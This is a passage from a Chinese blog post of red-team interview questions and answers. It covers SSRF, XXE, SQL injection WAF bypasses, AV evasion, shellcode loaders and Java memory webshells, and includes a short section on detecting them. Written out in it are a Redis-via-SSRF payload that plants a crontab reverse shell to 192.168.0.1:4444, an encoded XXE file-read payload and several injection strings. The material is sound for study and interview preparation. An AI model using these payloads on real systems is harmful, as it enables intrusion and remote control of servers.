+<h2 id="5、sqlserver默认端口是多少"><a href="#5、sqlserver默认端口是多少" class="headerlink" title="5、sqlserver默认端口是多少"></a>5、sqlserver默认端口是多少</h2><p>sqlserver 2000-2019  默认端口都是 1433</p>
+<h2 id="6、redis主从rce原理"><a href="#6、redis主从rce原理" class="headerlink" title="6、redis主从rce原理"></a>6、redis主从rce原理</h2><p>详见 <a href="#主从复制"><strong>Redis 主从复制</strong></a></p>
+<h2 id="7、csrf怎么防护"><a href="#7、csrf怎么防护" class="headerlink" title="7、csrf怎么防护"></a>7、csrf怎么防护</h2><p>严格校验客户端的 Referer 头</p>
+<p>验证客户端请求提交的随机 token</p>
+<p>图片验证码</p>
+<p>header请求头中的 jwt 令牌 token</p>
+<h2 id="8、ssrf怎么判断"><a href="#8、ssrf怎么判断" class="headerlink" title="8、ssrf怎么判断"></a>8、ssrf怎么判断</h2><p>服务端会去请求客户端提交的host地址，并响应host内容或有dns解析记录、或者根据网站的响应状态码判断</p>
+<h2 id="9、ssrf不出网怎么探测"><a href="#9、ssrf不出网怎么探测" class="headerlink" title="9、ssrf不出网怎么探测"></a>9、ssrf不出网怎么探测</h2><p>用服务端去读取localhost的网址或者127.0.0.1的web服务</p>
+<h2 id="10、ssrf只能用http怎么打weblogic"><a href="#10、ssrf只能用http怎么打weblogic" class="headerlink" title="10、ssrf只能用http怎么打weblogic"></a>10、ssrf只能用http怎么打weblogic</h2><p>weblogic的:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp存在ssrf漏洞</p>
+<p>可以利用ssrf探测内网redis并提交</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">text
+
+<span class="token builtin class-name">set</span> <span class="token number">1</span> “<span class="token punctuation">\</span>n<span class="token punctuation">\</span>n* * * * * <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.0.1/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n”
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc/
+config <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>
+save
+
+aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:6379/text%0A%0Aset%201%20%E2%80%9C%5Cn%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.1%2F4444%200%3E%261%5Cn%5Cn%E2%80%9D%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa">http://127.0.0.1:6379/text%0A%0Aset%201%20%E2%80%9C%5Cn%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.1%2F4444%200%3E%261%5Cn%5Cn%E2%80%9D%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa</a></p>
+<h2 id="11、xxe过滤system和public怎么绕过"><a href="#11、xxe过滤system和public怎么绕过" class="headerlink" title="11、xxe过滤system和public怎么绕过"></a>11、xxe过滤system和public怎么绕过</h2><p>双重实体编码绕过</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE GVI <span class="token punctuation">[</span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % xml <span class="token string">"&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;"</span><span class="token operator">></span>
+
+%xml<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="12、csp了解吗"><a href="#12、csp了解吗" class="headerlink" title="12、csp了解吗"></a>12、csp了解吗</h2><p>CSP（Content Security Policy，内容安全策略）它通过限制网页中可以加载的资源（如脚本和图像），来防止恶意攻击，如跨站脚本攻击（XSS）、CSRF等。CSP的主要原理是通过在网页中实施一些安全策略来限制代码执行，从而减少攻击者利用的机会。定义阻止执行的代码。</p>
+<h2 id="13、dom-xss有哪些关键字"><a href="#13、dom-xss有哪些关键字" class="headerlink" title="13、dom xss有哪些关键字"></a>13、dom xss有哪些关键字</h2><p>document.getElementById(“dom”).innerHTML</p>
+<h2 id="14、Location对象有哪些属性"><a href="#14、Location对象有哪些属性" class="headerlink" title="14、Location对象有哪些属性"></a>14、Location对象有哪些属性</h2><p>location属性用于获取或设置窗体的URL，并且可以用于解析URL</p>
+<h2 id="15、网站没使用cookie用token一般会存放在哪里"><a href="#15、网站没使用cookie用token一般会存放在哪里" class="headerlink" title="15、网站没使用cookie用token一般会存放在哪里"></a>15、网站没使用cookie用token一般会存放在哪里</h2><p>一般是sessionStorage或LocalStorage中</p>
+<p>sessionStorage：当浏览器关闭后token会失效</p>
+<p>LocalStorage： 浏览器关闭后，用户token依然有效</p>
+<h2 id="16、获取localStorage的函数名"><a href="#16、获取localStorage的函数名" class="headerlink" title="16、获取localStorage的函数名"></a>16、获取localStorage的函数名</h2><p>setItem存储</p>
+<p>getItem获取</p>
+<h2 id="17、jwt的攻击方式"><a href="#17、jwt的攻击方式" class="headerlink" title="17、jwt的攻击方式"></a>17、jwt的攻击方式</h2><p>1、默认key</p>
+<p>2、none签名</p>
+<p>3、空校验</p>
+<p>4、暴力破解key</p>
+<h2 id="18、sql注入绕waf"><a href="#18、sql注入绕waf" class="headerlink" title="18、sql注入绕waf"></a>18、sql注入绕waf</h2><p>看过滤了什么东西，尝试大小写、双写绕过加空格等方式绕过关键词过滤、还有内联注释、加密编码绕过。</p>
+<p>过滤了&#x3D;，可以用^异或&lt;,&gt;大于小于符号绕过、还有regexp、like、Rlike</p>
+<p>过滤了双引号可以用十六进制、char(ascii)、函数形式绕过</p>
+<p>过滤了空格可以用%0a、%a0、%00、%09、%0b、+等绕过</p>
+<p>还可以使用\绕过转义’如 </p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select * from users where uname&#x3D;&#39;admin\&#39; and password&#x3D;&#39; or 1&#x3D;1;#&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其他一些函数平替</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">substr<span class="token operator">-</span><span class="token operator">></span>mid<span class="token operator">-</span><span class="token operator">></span>substring
+
+ascii<span class="token operator">-</span><span class="token operator">></span>Hex<span class="token operator">-</span><span class="token operator">></span>bin
+
+@<span class="token variable">@user</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+@<span class="token variable">@version</span><span class="token operator">-</span><span class="token operator">></span>version<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+substr<span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">left</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+substr<span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">right</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+lpad<span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+rpad<span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+reverse
+
+字符串替换
+
+<span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">=</span>Hex<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">=</span>Unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x49</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>堆叠注入</p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">原SQL
+select * from user where id&#x3D;&#39;$user&#39;;
+
+插入 1&#39;;select &#39;1 引起堆叠注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>宽字节注入</p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">?id&#x3D;1%df%27  -&gt;  ?id&#x3D;1龓&#39;  %df会在gbk编码下与\组合成汉字导致绕过单引号转义<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>二次注入</p>
+<p>其实就是第一个点没有注入，但是第二个点调用第一个点的信息导致了注入。比如注册一个用户</p>
+<p>admin’#999</p>
+<p>当修改用户密码时，可能由于校验不严格，导致从session中获取的用户名引起了二次注入从而修改了admin的密码。</p>
+<p>内联注释</p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">&#x2F;!UnIon12345SelEcT&#x2F; 1,user()    数字范围 1000-50540<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="19、limit注入怎么利用"><a href="#19、limit注入怎么利用" class="headerlink" title="19、limit注入怎么利用"></a>19、limit注入怎么利用</h2><p>没有order by</p>
+<p>直接联合或者报错</p>
+<p>有order by</p>
+<p>在5.0.0&lt; mysql &lt;5.6.6 时</p>
+<p>用 procedure 构造报错注入&#x2F;时间盲注</p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">?id&#x3D;2,0 procedure analyse(updatexml(1,concat(0x7e,database()),1),1)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>不能报错用时间盲注</p>
+<p>?id&#x3D;2,0 procedure analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);%23</p>
+<h2 id="20、基于ast的waf怎么绕过"><a href="#20、基于ast的waf怎么绕过" class="headerlink" title="20、基于ast的waf怎么绕过"></a>20、基于ast的waf怎么绕过</h2><p>利用中间件+操作系统特性绕过</p>
+<p>在IIS+ASP&#x2F;ASP.NET中 S%ELECT会被识别为 select</p>
+<p>在windows有一些文件命名特性 &lt; &gt; ? &#x2F; 等</p>
+<h2 id="21、免杀了解吗"><a href="#21、免杀了解吗" class="headerlink" title="21、免杀了解吗"></a>21、免杀了解吗</h2><p>做过一些，原理就是对shellcode进行编码加密，绕晕waf。</p>
+<p>像AES加密，xor异或运算、异或base64编码等。另外还可以自己写一套编码规则用于对每一个字符进行一一对应。这些是绕过静态waf的方法，至于动态waf或者行为查杀，可以在操作系统申请内存，将shellcode直接写入内存中运行，这样可以绕过部分动态查杀。还可以写注册表或重启开机时的计划任务，让shellcode在waf程序加载前运行。</p>
+<p>webshell免杀的话了解过一些，主要利用了代码语言特性</p>
+<p>像php可以利用取反、异或、编码、动态调用等特性进行免杀</p>
+<p>jsp的没有过多了解，不过应该也是基于动态调用的，还有一种常见的就是unicode编码进行免杀</p>
+<h2 id="22、说说shellcode-loader具体流程"><a href="#22、说说shellcode-loader具体流程" class="headerlink" title="22、说说shellcode loader具体流程"></a>22、说说shellcode loader具体流程</h2><p>读取shellcode、申请一块可读可写可执行的内存、将shellcode写入内存、创建线程、等待线程结束、程序退出（一般需要程序永远运行、设置等待时间为负数即可）。</p>
+<p>方法</p>
+<p>赋值-&gt;VirtualAlloc函数(ctypes.c_int(0x40))-&gt;RtlMoveMemory函数-&gt;CreateThread函数创建线程-&gt;WaitForSingleObject函数检测线程的状态</p>
+<h2 id="23、shellcode有哪些加载器"><a href="#23、shellcode有哪些加载器" class="headerlink" title="23、shellcode有哪些加载器"></a>23、shellcode有哪些加载器</h2><p>太多了，想要详细了解可以学一下博客园这篇文章  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/17429771.html"><strong>总结加载Shellcode的各种方式-亨利其实很坏-博客园</strong></a> </p>
+<h2 id="24、内存马了解吗"><a href="#24、内存马了解吗" class="headerlink" title="24、内存马了解吗"></a>24、内存马了解吗</h2><p>了解一些，主要是Tomcat的内存马。分listener、filter、servlet型</p>
+<ul>
+<li><strong>Servlet</strong></li>
+</ul>
+<p>Servlet是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。Servlet 可以理解为某一个路径后续的业务处理逻辑。</p>
+<ul>
+<li><strong>Filter</strong></li>
+</ul>
+<p>Filter也称之为过滤器，可以动态地修改HttpServletRequest，HttpServletResponse中的头和数据。</p>
+<ul>
+<li><strong>Listener</strong></li>
+</ul>
+<p>Listener也称之为监听器，可以监听Application、Session和Request对象的创建、销毁事件，以及监听对其中添加、修改、删除属性事件，并自动执行自定义的功能。</p>
+<p>以java为例，客户端发起的web请求会依次经过Listener、Filter、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Servlet&spm=1001.2101.3001.7020">Servlet</a>三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。</p>
+<h3 id="Java-Instrument"><a href="#Java-Instrument" class="headerlink" title="Java Instrument"></a><strong>Java Instrument</strong></h3><p>java.lang.Instrument包是在JDK5引入的，开发者通过修改方法的字节码实现动态修改类代码。利用Instrument，开发者可以开发单独的代理Agent，实现对JVM进程的运行时监控，分析JVM进程运行时内存状态，甚至可以很方便地修改内存中类的字节码，修改或者扩展已有的功能。基于Instrument的Java Agent的使用方式有两种：</p>
+<ul>
+<li><strong>在JVM启动前加载</strong></li>
+</ul>
+<p>启动时配置-java agent参数，会执行Agent中的premain方法。</p>
+<ul>
+<li><strong>在JVM启动后加载</strong></li>
+</ul>
+<p>使用com.sun.tools.attach.VirtualMachine包提供的loadAgent方法，将Agent注入到指定的JVM进程中，会执行Agent中的agentmain方法。</p>
+<p>内存马无文件落地、通过一个url传参即可实现命令执行。如果想要传入任意url参数即可执行命令需要使用filter或listener型内存马。</p>
+<p>详细了解内存马可以通过阅读 <a target="_blank" rel="noopener" href="https://blog.nsfocus.net/webshell-interceptor/"><strong>内存马的攻防博弈之旅</strong></a>  </p>
+<h3 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h3><p>1、判断有没有新增或修改的类</p>
+<p>2、有没有对应的class文件</p>
+<p>3、xml配置有没有改动的注册</p>
+<p>4、随机类名</p>
+<p>5、检测agent</p>
+<p>6、检测jsp的访问日志</p>
+<p>当发现了内存马痕迹之后，可以收缩范围来排查路径</p>
+<p>检查tomcat日志</p>
+<p>检查中间件error.log日志，查看报错、可疑访问、命令执行请求</p>
+<p>如果是filter或listener型，可以检测url中大量带有favicondemo或favicon带参数，响应200的请求</p>
+<h2 id="25、添加filter马的具体方法名"><a href="#25、添加filter马的具体方法名" class="headerlink" title="25、添加filter马的具体方法名"></a>25、添加filter马的具体方法名</h2><p>ApplicationFilterChain对象的DoFilter方法是调用filter</p>
+<p>createFilterChain方法是添加filter马</p>
+<h2 id="26、了解CC链吗"><a href="#26、了解CC链吗" class="headerlink" title="26、了解CC链吗"></a>26、了解CC链吗</h2></body>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://egstar.top">Egstar</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://egstar.top/post/ac7c753b.html">http://egstar.top/post/ac7c753b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://egstar.top" target="_blank">Egstar站长</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="/images/zhongli.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/97765e90.html" title="护网行动(一)-护网前准备"><img class="cover" src="/images/beidou.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">护网行动(一)-护网前准备</div></div></a></div><div class="next-post pull-right"><a href="/post/e5813c31.html" title="面试沟通的艺术(一)-面试17准则"><img class="cover" src="/images/youla.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">面试沟通的艺术(一)-面试17准则</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/d9476fae.html" title="网络安全岗位面试"><img class="cover" src="/images/250124.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-24</div><div class="title">网络安全岗位面试</div></div></a></div><div><a href="/post/e5813c31.html" title="面试沟通的艺术(一)-面试17准则"><img class="cover" src="/images/youla.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-21</div><div class="title">面试沟通的艺术(一)-面试17准则</div></div></a></div><div><a href="/post/5f6fb293.html" title="面试沟通的艺术(二)-简历优化"><img class="cover" src="/images/xg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-23</div><div class="title">面试沟通的艺术(二)-简历优化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/pkds.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Egstar</div><div class="author-info__description">安全秘辛，古文经典</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Egstar1"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Egstar1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1337995241@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text">开始</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%BB%99%E4%BD%A0%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">1、给你个目标如何进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9C%89%E5%93%AA%E4%BA%9B%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">2、子域名有哪些收集方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E7%9F%A5%E9%81%93%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.3.</span> <span class="toc-text">3、知道哪些数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%AE%B2%E8%AE%B2%E5%90%84%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%80%8E%E4%B9%88getshell"><span class="toc-number">2.4.</span> <span class="toc-text">4、讲讲各个数据库怎么getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-number">2.4.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-number">2.4.2.</span> <span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">主从复制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle"><span class="toc-number">2.4.3.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-number">2.4.4.</span> <span class="toc-text">MSSQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81sqlserver%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">2.5.</span> <span class="toc-text">5、sqlserver默认端口是多少</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81redis%E4%B8%BB%E4%BB%8Erce%E5%8E%9F%E7%90%86"><span class="toc-number">2.6.</span> <span class="toc-text">6、redis主从rce原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81csrf%E6%80%8E%E4%B9%88%E9%98%B2%E6%8A%A4"><span class="toc-number">2.7.</span> <span class="toc-text">7、csrf怎么防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81ssrf%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD"><span class="toc-number">2.8.</span> <span class="toc-text">8、ssrf怎么判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81ssrf%E4%B8%8D%E5%87%BA%E7%BD%91%E6%80%8E%E4%B9%88%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.9.</span> <span class="toc-text">9、ssrf不出网怎么探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81ssrf%E5%8F%AA%E8%83%BD%E7%94%A8http%E6%80%8E%E4%B9%88%E6%89%93weblogic"><span class="toc-number">2.10.</span> <span class="toc-text">10、ssrf只能用http怎么打weblogic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81xxe%E8%BF%87%E6%BB%A4system%E5%92%8Cpublic%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">2.11.</span> <span class="toc-text">11、xxe过滤system和public怎么绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81csp%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">2.12.</span> <span class="toc-text">12、csp了解吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81dom-xss%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.13.</span> <span class="toc-text">13、dom xss有哪些关键字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14%E3%80%81Location%E5%AF%B9%E8%B1%A1%E6%9C%89%E5%93%AA%E4%BA%9B%E5%B1%9E%E6%80%A7"><span class="toc-number">2.14.</span> <span class="toc-text">14、Location对象有哪些属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15%E3%80%81%E7%BD%91%E7%AB%99%E6%B2%A1%E4%BD%BF%E7%94%A8cookie%E7%94%A8token%E4%B8%80%E8%88%AC%E4%BC%9A%E5%AD%98%E6%94%BE%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="toc-number">2.15.</span> <span class="toc-text">15、网站没使用cookie用token一般会存放在哪里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16%E3%80%81%E8%8E%B7%E5%8F%96localStorage%E7%9A%84%E5%87%BD%E6%95%B0%E5%90%8D"><span class="toc-number">2.16.</span> <span class="toc-text">16、获取localStorage的函数名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17%E3%80%81jwt%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.17.</span> <span class="toc-text">17、jwt的攻击方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18%E3%80%81sql%E6%B3%A8%E5%85%A5%E7%BB%95waf"><span class="toc-number">2.18.</span> <span class="toc-text">18、sql注入绕waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19%E3%80%81limit%E6%B3%A8%E5%85%A5%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">2.19.</span> <span class="toc-text">19、limit注入怎么利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20%E3%80%81%E5%9F%BA%E4%BA%8East%E7%9A%84waf%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">2.20.</span> <span class="toc-text">20、基于ast的waf怎么绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21%E3%80%81%E5%85%8D%E6%9D%80%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">2.21.</span> <span class="toc-text">21、免杀了解吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22%E3%80%81%E8%AF%B4%E8%AF%B4shellcode-loader%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="toc-number">2.22.</span> <span class="toc-text">22、说说shellcode loader具体流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23%E3%80%81shellcode%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.23.</span> <span class="toc-text">23、shellcode有哪些加载器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">2.24.</span> <span class="toc-text">24、内存马了解吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Instrument"><span class="toc-number">2.24.1.</span> <span class="toc-text">Java Instrument</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 